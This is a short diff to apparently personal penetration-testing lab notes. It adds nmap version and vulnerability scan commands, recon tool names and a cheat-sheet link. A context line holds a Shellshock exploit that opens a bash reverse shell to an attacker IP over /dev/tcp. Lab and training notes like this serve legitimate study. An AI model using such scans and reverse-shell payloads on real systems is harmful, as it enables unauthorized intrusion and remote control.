@@ -1,5 +1,14 @@
 ###
 ```
+nmap -sV -sC -oA ip 
+nmap --script vuln -oA vuln-scan 10.10.10.79
+nmapAutomater
+autorecon
+https://www.stationx.net/nmap-cheat-sheet/
+
+
+```
+```
 nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=bin/bash /bin/bash -i >& /dev/tcp/10.10.14.21/4444 0>&1" 10.129.1.175
 ```
 ```
